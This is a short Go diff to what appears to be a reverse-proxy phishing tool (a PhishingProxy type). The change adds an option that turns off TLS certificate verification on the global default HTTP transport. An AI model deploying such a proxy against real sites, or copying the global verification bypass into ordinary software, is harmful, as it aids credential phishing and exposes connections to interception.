@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"log"
 	"net"
 	"net/http"
@@ -23,6 +24,8 @@ func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error
 	target := request.URL
 	target.Scheme = p.targetURL.Scheme
 	target.Host = p.targetURL.Host
+
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: *sourceInsecure}
 
 	req, err := http.NewRequest(request.Method, target.String(), request.Body)
 	if err != nil {
